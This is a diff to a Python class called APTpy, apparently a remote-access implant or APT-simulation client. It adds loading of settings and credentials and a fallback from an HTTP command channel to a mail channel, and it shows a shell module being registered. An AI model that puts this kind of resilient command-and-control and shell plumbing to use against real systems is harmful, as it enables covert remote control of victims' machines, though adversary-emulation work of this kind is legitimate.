@@ -1,6 +1,9 @@
+import json
 import logging
 import logging.handlers
 import Queue
+from lib.channels.http import HttpChannel
+from lib.channels.mail import MailChannel
 from threading import Event
 from time import sleep
 from platform import system as platform_system
@@ -17,6 +20,9 @@ class APTpy:
         self.queue_recv = Queue.Queue()
         self.events = {}
 
+        # Used for debug only, you should hardcode those credentials to avoid external dependencies
+        self.settings = {}
+
         # Logging information
         aptpy_logger = logging.getLogger('aptpy')
         aptpy_logger.setLevel(logging.DEBUG)
@@ -28,6 +34,12 @@ class APTpy:
             rotate.setFormatter(logging.Formatter('%(asctime)s|%(levelname)-8s| %(message)s', '%Y-%m-%d %H:%M:%S'))
 
             aptpy_logger.addHandler(rotate)
+
+            try:
+                with open('settings.json', 'rb') as handle:
+                    self.settings = json.load(handle)
+            except IOError:
+                pass
 
         console = logging.StreamHandler()
         console.setLevel(logging.DEBUG)
@@ -114,9 +126,11 @@ class APTpy:
         self.client_id = disk
 
     def _registerChannels(self):
-        from lib.channels.http import HttpChannel
-
         self.channel = HttpChannel(self.client_id, self.queue_send, self.queue_recv, DEBUG)
+
+        # If we can't contact the server, fallback to mail
+        if not self.channel.enabled():
+            self.channel = MailChannel(self.client_id, self.queue_send, self.queue_recv, DEBUG, self.settings)
 
     def _registerModules(self):
         from lib.modules.shell import ShellModule
